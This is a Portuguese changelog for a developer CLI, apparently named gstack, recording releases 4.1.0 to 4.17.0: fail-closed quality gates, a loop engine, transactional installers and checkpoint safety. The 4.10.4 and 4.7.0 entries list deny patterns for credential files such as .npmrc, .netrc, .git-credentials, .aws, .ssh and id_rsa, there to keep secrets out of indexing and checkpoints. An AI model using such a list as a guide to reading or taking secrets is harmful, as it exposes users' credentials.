- **`verify --tier`** (aditivo): probe de engine (Docker) real; anexa `report.tier` e rebaixa
  status ready→blocked quando o tier bloqueia. Injetável (`opts.engineProbe`).
- **Testes** `quality_tiers_budget`: release sem engine bloqueia; `not_applicable`≠passed; budget
  unknown≠ok; tier desconhecido fail-closed; integração `verify --tier release` sem engine bloqueia
  + sem `--tier` nada muda. QG strict 0 (`downgradeIfTierBlocks` extraído p/ cc≤6); lint 0; typecheck.

## [4.17.0] - 2026-07-14 — Step-close incremental: nunca a suíte inteira por edição (PRD42 S42.7)

Abre a Fase 2 (qualidade). Uma edição roda SÓ as checagens que o diff pede — a suíte completa
fica para verify/proof. Estende o Action Kernel (não duplica a matriz superfície→checks).

- **`src/project-plan/change-surface.js`** (schema `gstack.change-surface.v1`): classifica o diff
  por SUPERFÍCIE (migrations/runtime/backend/cli/frontend/skills/tests/config/docs) via caminho, e
  decide se GATEIA release (`blocking`). Complementa o `classifyDiff` (por tipo de arquivo) do kernel.
- **`src/project-plan/step-close.js`** (schema `gstack.step-close.v1`): EXECUTA as checagens que
  `stepClose` (Action Kernel) escolheu, via runners injetados. Invariante `ranFullSuite: false`
  SEMPRE. Runner ausente → `skipped` (NÃO conta como pass); runner que falha/lança → `failed`.
- **Testes** `step_close_incremental`: superfície de risco gateia (docs-only não); **invariante**
  (diff de 500 arquivos NÃO roda a suíte); runner ausente=skipped≠pass; runner falho/exceção reprova
  (controle negativo); frontend seleciona `visual-evidence`. QG strict 0; lint 0; typecheck limpo.

## [4.16.0] - 2026-07-14 — Runtime manifest v3 + preview health-gated (PRD42 S42.6) — FECHA A FASE 1

Fecha a Fase 1 (produto). O manifest de runtime ganha campos de PROJETO (corroborados pela
evidência `.replit` do S42.0E) e o preview deixa de ficar "verde por subir".

- **Manifest v3** (`schemaVersion 3`): campos de projeto `workflows`/`postMerge`/`deploy`/`health`.
  `migrateManifestToV3` (não-destrutiva, idempotente, `migratedFrom`) preserva os services v2;
  `buildRuntimeManifestV3`; `validateRuntimeManifestV3` reaproveita a validação de serviços do v2.
  **v2 segue um contrato válido** (não quebra projetos existentes).
- **Preview health-gated** (`evaluatePreviewReadiness` + `previewFromState`): a URL de preview só
  fica `ready` quando um health probe REAL passou (`status="ready"`). Um serviço com URL mas
  `status="unhealthy"` (o supervisor grava URL mesmo assim) agora reporta `unhealthy` e **retém a
  URL** — nunca "verde por subir".
- **Higiene de legado** (Fallow diff-scoped trouxe a dívida ao editar o arquivo): `validateServices`
  (cc19), `migrateServiceToV2` (cc11) e `loadRuntimeManifest` (cc10) decompostos em tabelas/helpers
  para cc≤6, sem mudar comportamento.
- **Testes**: migração v2→v3 preserva services + idempotente; v3 valida workflows/deploy/health
  (controle negativo: schemaVersion errado, workflows não-array); preview só ready com health ok
  (controle negativo: unhealthy/sem-probe retêm URL); pipeline com serviço unhealthy NÃO libera
  preview ready. QG strict 0; lint 0; typecheck limpo.

## [4.15.0] - 2026-07-14 — Artifact Review Pipeline + traceability determinística (PRD42 S42.5)

Fecha a porta contra teatro de revisão e evidência órfã, com dois módulos puros e determinísticos.

- **`src/project-plan/artifact-review.js`** (schema `gstack.artifact-review.v1`): revisões em
  `spec → plan → compliance → quality`. `validateReview` exige **produtor ≠ revisor**. `reviewGates`:
  revisão de **LLM é advisory** (nunca bloqueia); só revisão **determinística** com
  `changes_requested` gateia. `aggregateReviews`: `ok` só sem review inválido E sem gate determinístico.
- **`src/project-plan/traceability.js`** (schema `gstack.traceability.v1`): cadeia
  `brief → spec → task → diff → test → evidence`; cada nó referencia o id anterior (`ref`).
  `validateChain` reprova estágio ausente OU `ref` quebrado (evita evidência que não se liga ao brief).
- **Testes** `artifact_review_traceability`: cadeia completa ok; estágio ausente e ref quebrado
  reprovam (controle negativo); produtor=revisor reprova; LLM `changes` vira advisory (não bloqueia);
  compliance determinístico `changes` gateia. QG strict 0; lint 0; typecheck limpo.

## [4.14.0] - 2026-07-14 — Behavioral Conformance: as skills P0 se COMPORTAM (PRD42 S42.4)

Novo subcomando `agents conformance`: cada skill P0 é exercitada em RED/GREEN/REFACTOR contra
o SEU verificador real (fixtures sintéticas determinísticas). `inconclusive` **nunca** é verde.

- **`src/skills/behavioral-conformance.js`** (schema `gstack.behavioral-conformance.v1`): runner
  BOUNDED (maxMs/maxTurns); `aggregateVerdict` com precedência `nonconformant > inconclusive >
  conformant`; erro/timeout no cenário → `inconclusive` (jamais pass). `aggregateRelease`:
  `ready` só se TODA P0 é `conformant`.
- **Specs P0 sobre verificadores REAIS**: `design-system` (RED=tokens vazios bloqueiam ·
  GREEN=direção+tokens liberam · REFACTOR=v1 migrado grandfathered) e `skill-execution`
  (RED=mutation reprova · GREEN=hash bate · REFACTOR=transição fora de ordem lança).
- **`agents conformance`** (subcomando novo): imprime/JSONs os vereditos; sai 1 se alguma P0 não
  for `conformant`.
- **Testes** `behavioral_conformance`: P0 conformant medido; precedência; **inconclusive ≠ ready**
  (controle negativo); fase quebrada → nonconformant; erro→inconclusive; bound maxMs. QG strict 0
  (`scenarioOutcome` cc≤6); lint 0; typecheck limpo.

## [4.13.0] - 2026-07-14 — Skill Execution Contract: selecionada ≠ aplicada (PRD42 S42.3)

Uma skill não é "aplicada" porque foi SELECIONADA. Este sprint dá teeth ao ciclo de execução
de skills com um contrato tipado + verificação por hash com **mutation test** embutido.

- **`src/skills/execution-contract.js`** (schema `gstack.skill-execution.v1`): ciclo
  `selected → loaded → applied → verified` (ou `failed`); transição fora de ordem =
  `invalid_transition` (fail-closed). `recordApplied` grava o **hash** de cada deliverable;
  `verifyExecution` recomputa e reprova se um deliverable **some** ou **muda** após o applied
  (mutation test). Contrato **sem deliverables NÃO é sucesso vazio** (`empty:true → failed`).
- **Enforcement honesto** (ligado ao S42.0A): `enforcementFor` só marca `enforced` para
  `real_hooks` (Claude); instructional/rules_only/partial → `advisory`. O contrato nunca afirma
  bloqueio que o harness não tem.
- **`contractsForRoute`** + `start` persiste `skill-execution.json` (um contrato por skill
  selecionada, estado `selected`, enforcement advisory na CLI). A verificação por hash roda onde
  a skill executa.
- **Testes** `skill_execution_contract`: ciclo feliz; **mutation** (deliverable ausente e conteúdo
  alterado reprovam); transição fora de ordem fail-closed; contrato vazio ≠ sucesso; enforcement
  honesto. QG strict 0 (cc≤6 em todo o módulo); lint 0; typecheck limpo.

## [4.12.0] - 2026-07-14 — Design Direction v2: o gate valida CONTEÚDO, não só status (PRD42 S42.2)

Fecha o gap real do Design System Gate v1: `statusOfDs` promovia **qualquer** `engine`/`path` a
`complete` — passava sem validar tokens/direção. v2 valida o conteúdo declarado, com migração
não-destrutiva que **não quebra projetos v1**.

- **Schema v2** (`gstack.design-system.v2`) + `migrateDesignSystem` (não-destrutiva, idempotente,
  marca `migratedFrom`/`contentValidated:false`). Artefatos v1 migram na leitura.
- **Validação de conteúdo** (`validateDesignContent`): exige direção + `tokens.colors` E
  `tokens.typography` não vazios. Só morde quem **declara conteúdo inline** (`tokens`/`direction`
  ou `status:generated`) — declarações EXTERNAS (só `path`/`engine`) e v1 seguem grandfathered.
- **Gate v2** (`evaluatePreWriteGate` via `gateDecision`): bloqueia STATUS ausente **ou** conteúdo
  declarado-porém-inválido, com razão específica (`falta: tokens.colors, ...`) e `requiredAction`
  distinta. `registerDesignSystem` grava v2 (`contentValidated:false` p/ declaração externa).
- **Testes**: DS com `generated` + tokens vazios **bloqueia** (v1 passava); DS com direção+tokens
  libera; artefato v1 grandfathered (migra p/ v2 na leitura, não quebra); unidade de
  `validateDesignContent`/`migrateDesignSystem` + controle negativo (nulo/vazio). QG strict 0
  (`gateDecision`/`violationList` extraídos p/ cc≤6); lint 0; typecheck limpo.

## [4.11.0] - 2026-07-14 — Intake estruturado + Product Brief (PRD42 S42.1)

Abre a Fase 1 (produto). O wizard do `start` deixa de ser 2 perguntas soltas e vira um **intake
estruturado** (≤5 decisões bloqueantes, cada uma com *why* + *consequência* + *default*) que
produz um **Product Brief** com aceites honestos.

- **Question Registry** (`src/project-plan/question-registry.js`): decisões bloqueantes
  (`projectName`/`mode`/`integrations`/`deployTarget`) com why/consequência; defaults e opções
  derivados do objetivo classificado (recipe) — não pergunta o que dá p/ inferir. Teto de 5
  decisões é **fail-closed** (excede → lança). `slugFromObjective` determinístico.
- **Intake** (`src/project-plan/intake.js`): resolve cada decisão rastreando a FONTE — `flag`
  (CLI explícito) · `user_answer` (respondida) · `recommended_default` (`--yes`/não-interativo).
  **`--yes` NUNCA inventa resposta**: grava o default com fonte explícita.
- **Product Brief** (`src/project-plan/product-brief.js`, schema `gstack.product-brief.v1`):
  cada aceite aponta um **verificador REAL** (scaffold→`verify --profile scaffold`, QG→`qg
  --strict`, lint) OU é `pending_verifier` com motivo (feature/integração → conformance S42.4 /
  E2E S42.13). `acceptanceIsHonest` = XOR (nunca os dois, nunca nenhum); `buildProductBrief` lança
  se algum aceite ficar desonesto. `acceptanceCoverage` p/ o scorecard.
- **Wizard = casca fina** (`wizard.js`) sobre o intake (não duplica FSM); `start` persiste
  `brief.json` junto do plano (brief vivo p/ o closeout S42.10). Sem TTY e sem UI injetada →
  não-interativo (evita pendurar no stdin — mesma regra `canPromptSelect`).
- **Testes**: `intake_product_brief.test.js` (fonte por decisão; flag sobrepõe; XOR do aceite +
  controle negativo; teto fail-closed; slug) e `start_wizard` ampliado (brief persistido). QG
  strict 0 (`runIntake` → `intakeCtx`, cc≤6); lint 0; typecheck limpo.

## [4.10.4] - 2026-07-14 — Golden Harness + package lifecycle + curadoria Replit (PRD42 S42.0E)

Fecha a **Fase 0** (reparo de baseline). Trava contratos de saída determinísticos como regressão
byte-a-byte, completa os npm scripts do S42.13 sem reimplementar nada e cura o dump Replit como
referência histórica (nunca dependência runtime).

- **Golden Harness (`scripts/golden.mjs` + `tests/golden/` + `npm run test:golden`).** Compara a
  saída REAL de comandos determinísticos contra fixtures versionados, normalizando o ambiental
  (dir temp/HOME/tmp/versão/separador). Os 2 casos (`create --dry-run --json` Lite e Full) travam
  a **Verdade de Capacidade do S42.0A**: Lite = zero escrita global + zero provisões; Full =
  `.atomic` + Casdoor/Atomic/ECC/AgentMemory. `--update` **RECUSA árvore suja** fora de
  `tests/golden/` (golden nunca é "atualizado só p/ passar CI"); `--fixtures <dir>` p/ o controle
  negativo do próprio harness.
- **Package lifecycle (`scripts/test-package.mjs` + `npm run test:e2e:package`).** NÃO reimplementa:
  COMPÕE `test-pack.mjs` (tarball smoke) + `test-e2e-lifecycle.mjs` (lifecycle isolado com HOME
  isolado + contrato 18 REAL/0 PLACEBO), propagando env e o primeiro exit não-zero. Cross-platform.
- **`npm run agents:check`** = alias `build:agents --check` (drift de agentes gerados vira gate).
- **Curadoria Replit** (`.docs/RESEARCH/replit-project-evidence/{manifest.md,findings.json}`,
  registrada como `archived_reference`). O schema `.replit` corrobora o manifest v3 (S42.6) como
  espelho de design — nunca dependência; nenhum plugin `@replit/*` vendorizado. Motivou
  **deny-patterns novos** no indexador (`SCOUT_DENYLIST`): `.npmrc`/`.netrc`/`.git-credentials`/
  `.pgpass`/`*.tfstate`/`.aws` (com teste + controle negativo).
- **Testes** `golden.test.js` (fixtures batem + controle negativo pega drift + normalização +
  guarda de árvore suja) e `context_scout` ampliado. QG strict 0 (`main`/`runCase` decompostos p/
  cc≤6); lint 0; typecheck limpo. **Fase 0 (S42.0A-E) COMPLETA** — S42.1 desbloqueado.

## [4.10.3] - 2026-07-14 — E2E de backend: gating `blocked_missing_engine` + harness Docker real (PRD42 S42.0D)

Estabelece a infraestrutura honesta de E2E de backend: capacidade `required` sem engine (Docker)
fica `blocked_missing_engine` — **nunca** skip-verde nem `not_applicable→passed`.

- **Gating (`src/capabilities/e2e-runner.js`).** `classifyE2E` (sem engine → `blocked_missing_engine`;
  com engine, o probe real decide `passed|failed`; nunca inventa sucesso), `dockerAvailable`
  (fail-closed), `aggregateCapabilityE2E` (required blocked/failed derruba `ready`; opcional não).
- **Runner (`scripts/test-capabilities.mjs` + `npm run test:e2e:capabilities`).** Probea o Docker:
  ausente → reporta `blocked_missing_engine` e sai 0 (local honesto); `--strict` sai 1 (release
  exige engine). Presente → roda `tests/e2e/capabilities/` com `GSTACK_CAP_E2E=1`.
- **Harness Docker REAL** (`tests/e2e/capabilities/docker-harness.e2e.test.js`): exercita um
  container (`alpine` pinado por **digest**) + teardown; gated por contexto (não acopla Docker ao
  suite principal). Prova que o harness roda Docker de verdade.
- **Workflow** `.github/workflows/capability-e2e.yml`: job ubuntu com Docker, timeout + artifact.
- **Testes** `capability_e2e_runner` (gating: blocked nunca vira passed; required bloqueia).
  Suíte JS 1051 (1 skip honesto) + Py 84; QG strict 0; lint 0; typecheck limpo.
- **Escopo honesto:** os probes POR-BACKEND (Casdoor RBAC, Atomic merge concorrente, AgentMemory
  retrieval, OpenHands sandbox) são os cenários 17-18 do **S42.13** — não stubados aqui.

## [4.10.2] - 2026-07-14 — `start` dirigido pelo LoopEngine canônico (PRD42 S42.0C)

Fecha o segundo (e último) bloqueador de baseline do §0. O `start` (runPipeline) deixa de ser uma
máquina de estados implícita paralela e passa a ser DIRIGIDO pelo LoopEngine canônico — fonte
única de ordem de fase e de caps.

- **Ordem de fase governada pelo motor.** Cada estágio do pipeline caminha pelas fases canônicas
  (`ENGINE_PHASES`) via `advanceEngine`; fase fora de ordem lança `invalid_transition` (não avança
  em silêncio). Mapeamento: `create`=approve+implement, `dev`=run, `test`=observe+diagnose,
  `verify`=checkpoint+verify, `preview`=proof; `review` é advisory (não move o motor).
- **Caps incontornáveis pelo motor.** Cada tentativa do create é contada por `recordAttempt`;
  atingir `maxIterations`/thrash → hard halt tipado (`status: blocked`). Snapshot do motor
  (`phase/status/counters/capped`) vai ao resultado e ao `status.json`.
- **Forma pública preservada:** `runPipeline` mantém `status/stages/attempts/handoffPath` — os
  193+ testes de pipeline seguem intactos; `engine` é aditivo.
- **Testes** `start_engine`: pipeline OK avança até `proof`; controle negativo de ordem
  (`advanceEngine` fora de ordem lança `invalid_transition`); controle negativo de cap (create
  falha em série → motor `blocked` + handoff, attempts=3). Suíte JS 1047 + Py 84; QG strict 0;
  lint 0; typecheck limpo.
- **Deferido honesto:** executores REAIS de cada fase (implement→harness, run→supervisor) e o
  `finalize()` de 4 portões seguem no ciclo `task`/`loop`; `start` é o scaffold governado.

## [4.10.1] - 2026-07-14 — Dream Audit comportamental canônico + Capability Truth Contract (PRD42 S42.0B)

Fecha um dos dois bloqueadores de baseline do §0 (o outro, `start`↔Loop Engine, é o S42.0C) e
planta a fonte única de verdade de capacidade.

- **Dream Audit comportamental é o DEFAULT do CLI.** `dream audit`/`dream status` rodam
  `audit({behavioral:true})`: presença de arquivo não vale como `REAL` (vira `NOT_PROVED`) sem
  contrato comportamental. Modo legado (por arquivo) só sob opt-in `--files-only`. O `proof`
  também audita comportamental — seguro para o `ready` (behavioral só rebaixa `REAL→NOT_PROVED`;
  `RISK`/`PLACEBO` intactos).
- **Capability Truth Contract (§5.11).** `src/capabilities/{contract,registry,probe}.js`: um
  `claim:real` exige backend EXERCITADO (runtime `healthy` + probe + controle negativo); arquivo
  presente é no máximo `configured` → `not_proved`. Suporte é POR PLATAFORMA — OpenHands é
  `wsl_only` no Windows e `not_proved` até o E2E de sandbox (S42.0D). Em LITE os backends do Full
  são `excluded`. `probe.js` é puro/injetável (sem chamadas reais de Docker).
- **Testes:** `dream_cli_behavioral`, `capability_contract` (com controles negativos Full).
  Suíte JS 1044 + Py 84 verdes; QG strict 0; lint 0; typecheck limpo.
- **Deferido honesto (incremental):** consumo pleno do registry por create/doctor + unificação
  dos warnings de readiness no Gate Registry.

## [4.10.0] - 2026-07-14 — Capability Truth: verdade do Lite e dos claims (PRD42 S42.0A)

Abre o programa PRD42 pela verdade operacional (antes de qualquer feature nova). Corrige três
divergências claim-vs-código confirmadas na auditoria da v4.9.0.

- **Vazamento do modo LITE (bug de usuário final).** `create` escrevia, em QUALQUER modo,
  `.mcp.json` com `casdoor-gateway`+`headroom`, os manifestos `paperclip.toml`/`symphony.yml`
  (que invocam `openhands.validate`) e bootava o Headroom; o `app.json` declarava
  `sandbox:"openhands"` fixo. Agora esses artefatos são exclusivos do **Full**; o `app.json`
  deriva de uma tabela `MODE_CAPABILITIES` (fonte única por modo → Lite: `sandbox:"none"`,
  `ticketOrchestration:null`, sem Casdoor/Headroom/OpenHands).
- **Metadata de harness honesto.** `OMNIHARNESS_MAP.mode` passa a derivar da matriz canônica
  (`adapter-matrix`): só enforcement `real_hooks` é rotulado `agent-hooks`; cursor/codex/windsurf/
  opencode não. O `.mdc` gerado deixa de prometer bloqueio via `agent-hooks`.
- **Claims sem medição removidos.** "até 95%" (`instructional.js`, texto ao usuário) e "60-80%"
  (`printing-press/registry.js`) — economia só é afirmada por ledger medido.
- **Testes:** `create_lite_capabilities` (Lite sem MCP/paperclip/OpenHands + controle negativo
  Full) e `create_full_claims` (guidance sem `%`; `agent-hooks` só para `real_hooks`). Suíte JS
  1036 + Py 84 verdes; QG strict `blocking_severity_count:0`; lint 0; typecheck limpo.

## [4.9.0] - 2026-07-13 — Release Candidate (fecha o programa PRD41)

### Sprint S41.9 — Templates vivos, honestidade do Dream Audit e RC (PRD41 / PRD40 P1.6+P1.7+P1.8)

Fecha o programa de recuperação de integridade v4. A honestidade do audit sobe de nível, o
closeout vira transacional e um checklist rastreável declara a prontidão de RC.

- **P1.6 — Dream Audit comportamental.** `src/dream/claim-contract.js`: um claim só é `REAL` COM
  contrato comportamental (evidenceAdapter + e2eCommand + negativeControl + freshness). Presença de
  arquivo deixa de valer — vira `NOT_PROVED`. `audit({behavioral:true})` aplica a queda honesta;
  RISK/PLACEBO ficam intactos (o proof não é afetado).
- **P1.8 — Closeout transacional.** `buildCloseout` ganha `fresh`: só verdade se o refresh RODOU e
  ficou `ok`; refresh falho/degradado REMOVE o claim de frescor (o trabalho não se perde, mas não se
  finge atualização).
- **RC — checklist DoD §10.** `src/dream/rc-checklist.js` mapeia os 10 P0 + 8 P1 do PRD40 →
  sprint/versão/prova; `rcReadiness` só dá `ready:true` com TODOS os P0 `delivered`; um P0 pendente
  derruba (fail-closed). Suíte JS 1031/1031. QG strict 0.

### Estado do programa PRD41 (S41.0 → S41.9)
Os **10 bloqueadores P0** do PRD40 estão entregues e provados (cada um com controle negativo):
P0.1 QG fail-closed · P0.2 source-parity · P0.3 isolamento de projeto · P0.4 isolamento de testes ·
P0.5 ordem real do loop · P0.6 caps incontornáveis · P0.7 checkpoints seguros · P0.8 Action Kernel
governando · P0.9 instalador transacional · P0.10 `.env` nunca exposto. P1.1–P1.6/P1.8 entregues;
**P1.7 (matriz E2E de templates nos 3 SOs em CI) fica como incremento honesto** — declarado `partial`
no checklist.

## [4.8.0] - 2026-07-13

### Sprint S41.8 — Headroom roteado de verdade (PRD41 / PRD40 P1.4)

O roteamento deixou de ser uma função sem chamador, e a economia deixou de ser um número
acumulado sem prova de causalidade.

- **Chamador de PRODUÇÃO.** `supervisor.planStart` chama `ensureRoutedChildEnv` quando
  `opts.routing.enabled` (Full + opt-in): o env do processo-FILHO recebe as base-URLs do proxy.
  Sem opt-in, o env do child é intocado e o `process.env` global **NUNCA** é mutado (child-scoped,
  provado byte-a-byte).
- **Economia por DELTA.** `src/tools/headroom-run.js::proveEconomyDelta` mede o delta de savings
  (antes/depois) vinculado ao `runId`; só afirma economia com `delta.calls>0 && delta.tokensSaved>0`
  — substitui o número lifetime acumulado.
- **Ownership de porta (negativo obrigatório).** `proxyPortOwnership`: porta ocupada por processo
  ALHEIO → `foreign`/`abort` — jamais reutiliza ou mata processo de terceiro; só `reuse` com
  PID+idade batendo com o manifesto do nosso proxy.
- Invariantes intactas: nunca `wrap`, nunca MCP global, nunca config global de harness. Suíte JS
  1025/1025. QG strict 0.

### Escopo honesto (deferido)
Adapters testados por harness (OpenCode/Cursor entram só com adapter provado; senão `unsupported`)
e o supervisor de proxy com porta dinâmica + handshake por nonce ficam como incremento sobre esta
base (o chamador real, o delta e o ownership-guard estão entregues e provados).

## [4.7.0] - 2026-07-13

### Sprint S41.7 — Checkpoints seguros (PRD41 / PRD40 P0.7)

Checkpoint captura e restaura arquivos do working tree — passou a falhar FECHADO contra
traversal, symlink, segredo e blob adulterado.

- **Guardas** (`src/skills/checkpoint-guard.js`, puro/injetável): `validCheckpointId` (runId/seq
  do SISTEMA — traversal/estranho rejeitado); `resolveWithin` (path canônico DENTRO do root —
  absoluto, `../`, e symlink/junction/UNC que escapa falham **ANTES de ler**); `isDeniedPath`
  (`.env*`, `.git/`, `.ssh`, `.aws`, `.npmrc`, `id_rsa*` nunca entram); `contentHasSecret`
  (arquivo permitido mas com segredo embutido → negado).
- **createCheckpoint fail-closed:** qualquer arquivo negado rejeita o checkpoint INTEIRO sem
  persistir nada.
- **Rollback atômico anti-tamper:** verifica o sha256 de TODO blob capturado ANTES de escrever;
  qualquer divergência → aborta (`tamper_detected`) sem tocar o working tree.
- Suíte adversarial (11): traversal/junction/`.env`/segredo negados antes de ler; blob adulterado
  aborta com working tree intacto; seq externo inválido rejeitado. Suíte JS 1016/1016. QG strict 0.

### Escopo honesto (deferido)
Store content-addressed por sha256 (dedupe) e `green` DERIVADO só do motor (matar `--green`
manual, que cascata nos testes do loop) ficam como incremento — a segurança do P0.7
(containment/denylist/tamper) está entregue e provada.

## [4.6.0] - 2026-07-13

### Sprint S41.6 — QA visual real (PRD41 / PRD40 P1.1)

O visual-gate deixou de aceitar evidência de fachada: a acessibilidade é medida de verdade e o
screenshot é verificado no disco por hash.

- **a11y REAL.** Removido o `a11y: { violations: [] }` HARDCODED do driver — `defaultA11yProbe`
  injeta o axe-core na página e roda de verdade; ausente → `checked:false` (a11y **NÃO
  verificada**, jamais fingida como "limpa"). Probe injetável.
- **Evidência com hash.** `verifyScreenshotEvidence` checa existência + sha256 do screenshot no
  disco — não confia no path. Screenshot declarado mas ausente → falha por **evidência**;
  `expectedHash` divergente → falha por **evidência adulterada**.
- **4 lentes determinísticas** (QA/engenharia/segurança/produto) sobre o app rodando —
  heurísticas, nunca LLM (`evaluateLenses`).
- Cada motivo de falha é **DISTINTO**: erro 500 → rede; violação a11y plantada → a11y;
  screenshot ausente/adulterado → evidência. Suíte JS 1005/1005. QG strict 0.

### Escopo honesto (deferido)
`tools doctor` instalar Playwright + axe-core sob consentimento (aparecendo no dry-run do S41.3) e
a aplicabilidade do gate amarrada ao Gate Registry (S41.5) são incrementais; nesta máquina, sem
Playwright/axe-core, o gate reporta `needs_browser`/`a11y checked:false` — honesto.

## [4.5.0] - 2026-07-13

### Sprint S41.5 — Action Kernel ligado + Gate Registry central (PRD41 / PRD40 P0.8 + P1.2 + P1.3)

O kernel deixou de ser só um conjunto de primitivas e passou a GOVERNAR ações reais por um
ponto único; o `proof` deixou de decidir ad-hoc quem bloqueia e passou a consumir um registro
central de gates.

- **P0.8 — adapter único.** `runGovernedAction({action,ctx,execute,root,runId})` (em
  `action-kernel.js`) é o ponto por onde ações passam: `preAction` decide → se `deny` E o
  harness é ENFORCED, `execute` NUNCA roda e o recibo registra a negação (exit 126) → senão
  executa → `postAction` → UMA entrada no ledger `.gstack/runs/<runId>/actions.jsonl`. Harness
  instrucional (`ctx.enforced=false`) declara `advisory:true` e NÃO simula bloqueio.
- **P1.3 — conformance / controle negativo.** Teste prova que uma ação negada NÃO chama
  `execute`: remover o gate do kernel faz o teste falhar (o enforcement é verificável por caminho).
- **P1.2 — Gate Registry central.** Novo `src/skills/gate-registry.js`: cada gate do proof
  declara `id/version/severity(hard|advisory)/appliesTo/evidenceKey/toolMissing/negativeControl`.
  `resolveGateOutcomes` monta blockers×warnings PELO registry — `hard` bloqueia, `advisory` só
  avisa (Headroom routing nunca reprova). `buildProof` consome o registry (paridade provada);
  `validateGateContract` garante contrato completo.
- Suíte JS 999/999. QG strict `blocking_severity_count: 0`.

### Escopo honesto (deferido)
Falta ligar `post_tool_use_review.py` para DELEGAR ao kernel via CLI bridge e unificar o ledger
do kernel com VFA/provenance numa fonte só — incremental sobre o adapter e o registry desta base
(o adapter, o ledger por-run e o registro central já são reais e provados).

## [4.4.0] - 2026-07-13

### Sprint S41.4 — Loop Engine canônico (PRD41 / PRD40 P0.5 + P0.6 + P1.5)

O ciclo Replit-parity ganhou um MOTOR único (`src/skills/loop-engine.js`) — o único que muta
fase e contadores sobre o schema `replit-loop.v1`. Fecha três defeitos:

- **P0.5 — ordem real.** Pipeline completo (`intent→plan→scout→approve→implement→run→observe→
  diagnose→autocorrect→checkpoint→verify→proof→handoff`) só avança por transições declaradas;
  fase fora de ordem lança `invalid_transition` (tipado) e NÃO muda a fase. `loop economy` antes
  de `diagnose` agora reprova com `invalid_transition` (exit 1) — a permissividade antiga era o bug.
- **P0.6 — caps incontornáveis.** Contadores (tentativas, wall-clock, tokens, falhas idênticas
  consecutivas, thrash por hash de diff/erro) são calculados PELO MOTOR — o chamador não injeta
  `consumed`; wall-clock vem do relógio do motor. Limite → hard halt (`blocked`). Thrashing =
  mesma falha 3× seguidas.
- **P1.5 — status tipado.** `finalize` retorna `completed | planned_only | handoff | blocked |
  cancelled | not_executed`; `completed` EXIGE os 4 portões (aceites + observação fresca +
  checkpoint verde provado + `proof.ready`).
- Teste property-based (300×20): nenhuma sequência aleatória pula transição. `phaseAtLeast`/
  `phaseRank` = fonte única de ordem, consumida pelo CLI. Suíte JS 990/990. QG strict 0.

### Escopo honesto (deferido)
O motor é o contrato provado. Substituir `start`/`runPipeline` pelo motor e ligar os executores
REAIS de cada fase (implement→harness, run→supervisor, autocorrect→re-entrada) é incremental
sobre esta base (S41.4 entrega o state-machine + caps + status; os executores reais chegam junto
com S41.6/visual e a integração do `start`).

## [4.3.0] - 2026-07-13

### Sprint S41.3 — Instalador e create transacionais (PRD41 / PRD40 P0.9 + P0.10)

Instalação/scaffold com escrita global deixou de ser "best-effort": qualquer falha no meio
reverte tudo, e o que o dry-run mostra é, por construção, o que a execução faz. Segredo nunca
vira view.

- **P0.9 — journal transacional.** Novo `src/installer/journal.js`
  (`InstallJournal`/`runTransaction`) captura o estado PRÉVIO de cada escrita (arquivo ausente
  vs. bytes originais; dir criado) e, em QUALQUER falha, reverte TUDO ao byte exato — rollback
  automático intrínseco (não um `uninstall --restore-only` manual).
- **Plano único (dry-run === execução).** `src/installer/operation-plan.js`: `buildAtomicPlan`
  é o plano que o dry-run RENDERIZA (path+hash) e a execução RODA pelo journal — proibido
  divergir. O global só entra no plano se ainda não existir (não clobbera config do usuário).
- **P0.10 — `.env` nunca exposto.** `assertNoEnvExposure` rejeita qualquer `.env`/`.env.*`
  numa lista de exposição. `create` parou de escrever `~/.atomic/config.toml` com `.env` no
  `default_expose` (a view do projeto já o excluía; a global não — inconsistência fechada).
- Testes: fault-injection reverte byte-a-byte; commit mantém; dry-run===execução (paths);
  a trava pega `.env`/`.env.local`/aninhados; fixture de create → zero `.env` exposto.
- Suíte JS 980/980, Python 84/84. QG strict `blocking_severity_count: 0`.

### Escopo honesto (deferido)
Journal e plano cobrem as escritas Atomic (project + global). A extensão do plano/journal a
TODAS as fases do Full (ECC/AgentMemory/Casdoor com ownership por projectId) e a matriz
Lite×Full versionada seguem como trabalho incremental sobre esta base; o núcleo transacional
e a trava anti-`.env` estão provados.

## [4.2.0] - 2026-07-12

### Sprint S41.2 — Isolamento de projeto e testes (PRD41 / PRD40 P0.3 + P0.4)

A ativação por-projeto era furável: a mera existência de `.gstack/` ligava as regras, então
um `.gstack` vazado/copiado (ex.: resíduo de teste sob `%TEMP%`) podia injetar governança e
identidade num projeto alheio — e quebrava testes vizinhos que criavam projetos em subpastas
do TEMP. **Ativação agora exige um marcador canônico provado, e o lado JS grava esse marcador
de verdade** (nada de "ativado" sem hooks reais).

- **P0.3 — marcador canônico `gstack.project.v1`.** `hooks/hooks/_paths.py`:
  `find_gstack_root` só ativa com `.gstack/project.json` VÁLIDO (schema + `root` canônico
  batendo com o diretório). Um `.gstack` nu permanece INERTE. Novos `write_project_marker`
  (migração explícita) e `_valid_project_marker`.
- **Espelho JS do marcador.** Novo `src/project/identity.js`
  (`writeProjectMarker`/`readProjectMarker`/`hasValidMarker`) espelha byte-a-byte o contrato
  do validador Python. `create` grava o marcador (mode lite/full) — projeto novo nasce ATIVO;
  `enable` grava e **MIGRA** um `.gstack/` legado sem marcador; `status` reporta a verdade pelo
  marcador (`PRESENTE MAS INERTE` quando falta). Teste **cross-language** prova que o marcador
  escrito pelo JS ativa o `find_gstack_root` do Python.
- **P0.4 — higiene e sentinela de vazamento.** Testes com `mkdtemp()` sem cleanup passam a
  limpar; nova sentinela `test_no_activation_leak.py` falha se a árvore de TEMP ativar qualquer
  projeto (pega inclusive um marcador VÁLIDO vazado) ou se sobrar `.gstack` na raiz do TEMP.
  Fixtures de teste migradas para `mark_project`.
- Suíte JS 975/975, Python 84/84. QG strict `blocking_severity_count: 0`.

## [4.1.0] - 2026-07-12

### Sprint S41.1 — Quality Gate fail-closed (PRD41 / PRD40 P0.1)

Fecha o bloqueador mais crítico: o `qg.py` declarava `PASS` quando o Fallow **falhava
operacionalmente** (exit 2 por worktree/baseline), porque o veredito era calculado só a
partir de uma lista de findings — vazia num payload de erro. **Falha de ferramenta agora
é falha do gate.**

- **`hooks/hooks/qg.py`** — `classify_tool_failure(raw, returncode, total_findings)`
  roda **antes** do veredito por achados e distingue `tool_failed` de `quality_failed`:
  - `error: true` no payload, `verdict/status/result` ∈ {error, crashed, aborted,
    tool_error, timeout}, schema não-objeto/array, **exit ≥ 2** (erro operacional), ou
    **exit ≠ 0 sem nenhum achado** que o explique → `tool_failed` (`pass:false`, exit 1).
